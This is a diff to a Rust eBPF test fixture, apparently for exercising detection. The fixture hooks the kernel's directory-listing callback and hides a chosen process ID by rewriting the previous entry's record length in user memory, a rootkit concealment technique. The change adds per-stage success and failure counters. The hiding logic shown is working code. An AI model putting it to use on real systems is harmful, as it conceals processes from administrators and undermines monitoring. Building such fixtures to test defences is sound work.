@@ -55,13 +55,17 @@ use aya_ebpf::{
     maps::Array,
     programs::FEntryContext,
 };
+use core::sync::atomic::{AtomicU64, Ordering};
 
-/// The fixture's one control slot: the pid to hide (0 = inert). The
-/// loader writes the marker's pid before attaching; the program does
-/// nothing until the slot is nonzero - an estate left behind by a
-/// crashed run hides nobody.
+/// The fixture's control slot and its census counters: slot 0 is the
+/// pid to hide (0 = inert - the loader writes the marker's pid before
+/// attaching, an estate left behind by a crashed run hides nobody),
+/// slots 1..5 are the counters the loader's census line reads back:
+/// the fires, the failed probe reads, the name matches, the writes
+/// that landed, the writes the kernel refused. A hide that does not
+/// land names its stage, never a guess.
 #[map(name = "targets")]
-static TARGETS: Array<u64> = Array::with_max_entries(1, 0);
+static TARGETS: Array<u64> = Array::with_max_entries(6, 0);
 
 /// The `getdents_callback64` container's cursor field (`current_dir`,
 /// the user buffer position THIS entry is about to be written at):
@@ -103,6 +107,15 @@ pub fn pidhide(ctx: FEntryContext) -> i32 {
     }
 }
 
+/// The census counter: one fetch-add per stage, the facts the
+/// loader's census line names back.
+fn bump(slot: u32) {
+    if let Some(ptr) = TARGETS.get_ptr(slot) {
+        let cell = unsafe { &*((ptr as *mut u64).cast::<AtomicU64>()) };
+        cell.fetch_add(1, Ordering::Relaxed);
+    }
+}
+
 /// The hide: parse the entry name's leading decimal digits, compare
 /// them to the target pid, and grow the predecessor's record length
 /// by the entry about to be written. Returns 1 when a pid was
@@ -118,6 +131,7 @@ fn try_pidhide(ctx: &FEntryContext) -> Result<i32, i32> {
     // carries the whole hide - edition 2024 wants the unsafe ops
     // explicit, and this is where they all live.
     unsafe {
+        bump(1);
         let container: i64 = ctx.arg(0);
         if container == 0 {
             return Ok(0);
@@ -142,11 +156,15 @@ fn try_pidhide(ctx: &FEntryContext) -> Result<i32, i32> {
         // into, the named skip (the loader's batch is large enough
         // that the marker's entry practically never leads).
         let mut head = [0u8; 12];
-        bpf_probe_read_kernel_buf(
+        if bpf_probe_read_kernel_buf(
             (container as usize as *const u8).add(CONTAINER_CURSOR),
             &mut head,
         )
-        .map_err(|_| 1i32)?;
+        .is_err()
+        {
+            bump(2);
+            return Err(1i32);
+        }
         let cursor = u64::from_le_bytes(head[0..8].try_into().map_err(|_| 1i32)?) as usize;
         let prev_reclen = u32::from_le_bytes(head[8..12].try_into().map_err(|_| 1i32)?) as usize;
         if cursor == 0 || prev_reclen == 0 {
@@ -163,8 +181,10 @@ fn try_pidhide(ctx: &FEntryContext) -> Result<i32, i32> {
             return Ok(0);
         }
         let mut name = [0u8; NAME_DIGITS_MAX];
-        bpf_probe_read_kernel_buf(name_ptr as usize as *const u8, &mut name)
-            .map_err(|_| 1i32)?;
+        if bpf_probe_read_kernel_buf(name_ptr as usize as *const u8, &mut name).is_err() {
+            bump(2);
+            return Err(1i32);
+        }
         let mut value: u64 = 0;
         let mut digits = 0usize;
         let mut index = 0usize;
@@ -180,6 +200,7 @@ fn try_pidhide(ctx: &FEntryContext) -> Result<i32, i32> {
         if digits == 0 || value != target {
             return Ok(0);
         }
+        bump(3);
 
         // The absorb: the predecessor's d_reclen grows by the hidden
         // entry's length - the kernel's own formula
@@ -194,11 +215,16 @@ fn try_pidhide(ctx: &FEntryContext) -> Result<i32, i32> {
             return Ok(0);
         }
         let value16: u16 = grown as u16;
-        bpf_probe_write_user(
+        if bpf_probe_write_user(
             (cursor - prev_reclen + 16) as *mut u16,
             &value16,
         )
-        .map_err(|_| 1i32)?;
+        .is_err()
+        {
+            bump(5);
+            return Err(1i32);
+        }
+        bump(4);
         Ok(1)
     }
 }
